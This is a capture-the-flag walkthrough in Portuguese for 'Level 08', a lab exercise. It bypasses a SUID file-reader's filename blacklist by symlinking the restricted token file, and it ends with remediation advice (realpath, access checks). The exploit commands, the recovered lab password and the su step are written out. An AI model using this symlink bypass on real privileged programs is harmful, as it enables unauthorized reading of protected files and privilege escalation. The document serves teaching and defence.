# 𝕃𝕖𝕧𝕖𝕝 𝟘𝟠

## 🎯 Objetivo
O objetivo deste nível é ler o conteúdo de um arquivo restrito (`token`), contornando a verificação de segurança falha de um binário SUID que tenta bloquear o acesso com base apenas no nome do arquivo.

## 🔍 Análise da Vulnerabilidade

* **Tipo:** Insecure Filename Check (Verificação de Arquivo Insegura) / Symlink Bypass (Bypass por Link Simbólico).
* **Arquivo Alvo:** `level08` (Executável SUID em C) e o arquivo `token`.
* **Comportamento:** O binário `level08` age como um leitor de arquivos executado com privilégios elevados. Para tentar "proteger" o arquivo `token`, o desenvolvedor implementou uma verificação de string simples. O programa verifica se a palavra "token" está presente no argumento digitado pelo usuário. Se estiver, a leitura é bloqueada.

    A falha ocorre porque o programa avalia apenas a string digitada no terminal, e não o caminho real do arquivo no sistema. Como o Linux suporta links simbólicos (atalhos), podemos criar um arquivo com um nome inofensivo (como `flag`) que aponte diretamente para o arquivo `token`. O programa validará o nome inofensivo e o sistema operacional resolverá o atalho por debaixo dos panos, entregando o conteúdo proibido.

## 💻 Passos para Exploração (Exploit)

1.  **Reconhecimento:**
    Listamos os arquivos e identificamos o executável SUID e o arquivo `token`, que não temos permissão para ler diretamente.
    ```bash
    ls -al
    # Saída:
    # total 28
    # dr-xr-x---+ 1 level08 level08  140 Mar  5  2016 .
    # d--x--x--x  1 root    users    340 Aug 30  2015 ..
    # -r-x------  1 level08 level08  220 Apr  3  2012 .bash_logout
    # -r-x------  1 level08 level08 3518 Aug 30  2015 .bashrc
    # -rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
    # -r-x------  1 level08 level08  675 Apr  3  2012 .profile
    # -rw-------  1 flag08  flag08    26 Mar  5  2016 token
    ```

2.  **Identificação do Arquivo:**
    ```bash
    file level08
    # level08: setuid setgid ELF 32-bit LSB executable, Intel 80386...
    ```

3.  **Análise Dinâmica (Rastreamento de Comportamento):**
    Utilizamos o `ltrace` para entender como o programa espera ser utilizado. Ele pede um arquivo como argumento para ler.
    ```bash
    ltrace ./level08
    # Saída revela a instrução de uso:
    # printf("%s [file to read]\n", "./level08")
    ```
    > Ao tentar ler o arquivo diretamente (`./level08 token`), o programa retorna um erro customizado negando o acesso, evidenciando a restrição de nome (blacklist).

4.  **Preparação e Execução do Exploit:**
    Criamos um link simbólico no diretório temporário `/var/tmp/` com um nome que passe pela validação do programa (`flag`), apontando para o arquivo restrito. Em seguida, executamos o binário passando o atalho.
    ```bash
    ln -s /home/user/level08/token /var/tmp/flag
    ls -al  /var/tmp/flag
    # Saída: lrwxrwxrwx 1 level08 level08 24 Mar  2 19:39 /var/tmp/flag -> /home/user/level08/token

    ./level08 /var/tmp/flag
    # Saída: quif5eloekouj29ke0vouxean
    ```
    > O binário validou a string "flag", passou pela verificação de segurança, e leu o conteúdo do destino final do link simbólico (`token`).

## 🚩 Solução / Flag
O bypass do link simbólico foi executado com sucesso. O conteúdo retornado é, na verdade, a senha do usuário `flag08`.
```bash
su flag08
# Inserir a senha decifrada: `quif5eloekouj29ke0vouxean`
getflag
```

Senha para o próximo nível: `quif5eloekouj29ke0vouxean`

## 🛡️ Prevenção (Como corrigir)
1. **Validação de Caminho Real (Realpath)**: Nunca baseie decisões de segurança apenas na string do caminho digitado pelo usuário. Antes de verificar se um arquivo é permitido, o programa deve resolver todos os links simbólicos e caminhos relativos usando funções de sistema como `realpath()`.

2. **Checagem de Permissões Adequada**: Em vez de fazer uma "lista negra" (blacklist) de nomes de arquivos, o programa deve verificar as permissões reais do usuário executor sobre aquele arquivo usando a função `access()`, garantindo que não haja escalação indevida de privilégios.
